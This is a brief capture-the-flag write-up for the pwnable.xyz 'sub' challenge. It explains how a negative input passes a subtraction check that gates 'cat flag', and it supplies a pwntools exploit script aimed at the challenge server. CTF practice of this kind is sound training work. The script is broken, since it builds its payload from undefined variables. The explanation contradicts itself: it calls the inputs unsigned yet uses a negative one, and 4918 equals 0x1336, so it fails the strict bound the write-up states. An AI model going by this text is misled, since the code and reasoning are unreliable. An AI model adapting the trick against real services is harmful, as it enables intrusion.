This challenge takes 2 **unsigned integers** as input and checks:
`num1 < 0x1336` && `num2 < 0x1336` and in order to execute `"cat flag"`: `num1 - num2 == 0x1337`.
That means we can use a negative number so that `"-"` - `"-"` = `"+"`.  
Convert hex to decimal and numbers 4918 and -1 give us the result we want. 

## Exploit
```python
#!/usr/bin/python3
from pwn import *

ip = 'svc.pwnable.xyz'
port = 30001
filename = './sub' # change this

def pwn():
	
	r = remote(ip, port)
	num1 = b'4918'
	num2 = b' -1'
	payload = arg1 + arg2
	r.sendlineafter(':', payload)
	print(r.recvall().decode('utf8'))

pwn()
```
